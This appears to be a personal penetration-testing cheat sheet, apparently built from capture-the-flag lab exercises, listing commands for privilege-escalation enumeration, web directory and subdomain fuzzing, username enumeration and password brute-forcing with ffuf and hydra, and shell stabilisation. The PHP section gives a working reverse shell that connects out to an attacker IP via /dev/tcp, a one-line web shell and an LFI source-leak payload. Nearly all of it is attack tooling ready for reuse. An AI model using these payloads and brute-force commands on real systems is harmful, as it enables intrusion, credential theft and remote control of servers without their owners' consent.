# This section is for documenting common commands that are a pain to try and find again
### debconf: DbDriver "config": /var/cache/debconf/config.dat is locked by another process: Resource temporarily unavailable
    sudo fuser -v /var/cache/debconf/config.dat
    sudo kill 8123

## Privesc
- ### Find SUID binaries
        find / -perm -u=s -type f 2>/dev/null

- ### list sudo-able binaries
        sudo -l

## Web enumeration
 - ### fuzz different parts of web URL
        ffuf -w dns_nameslist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.244.57 -fs 2395
 - ### find directories for a website
        gobuster -w directory_list.txt -u 10.10.244.57
 - ### find valid usernames with ffuz
        ffuf -w ~/tools/usernames_list.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.176.13/customers/signup -mr "username already exists"
 - ### find valid usernames with hydra (S= denotes succesful message or stop condition)
        hydra -L ~/tools/usernames_list.txt -p x 10.10.61.61 http-post-form "/customers/signup:username=^USER^&email=x&password=x&cpassword=x:S=An account with this username already exists"
 - ### brute force username/password with ffuf
        ffuf -w validusernames.txt:W1,/home/misael/tools/rockyou.txt:W2 -X POST -d "username:W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.61.61/customers/login -fc 200
 - ### brute force username/password with hydra
        hydra -L validusernames.txt -P ~/tools/rockyou.txt 10.10.61.61 http-post-form "/customers/login:username=^USER^&password=^PASS^:Incorrect username/Password"
        

## PHP

- ### php reverse shell
        <?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.2.64.239/1234 0>&1'");

- ### php web shell
        <?php system($_GET[cmd]);?>

- ### php leak source code w/ LFI
        pagename=php://filter/convert.base64-encode/resource=login

### Stabilize shell
    python -c 'import pty; pty.spawn("/bin/bash")'
    Ctrl ^Z
    echo $TERM
    stty -a
    stty raw -echo
    reset
    xterm

# TO BE CONTINUED

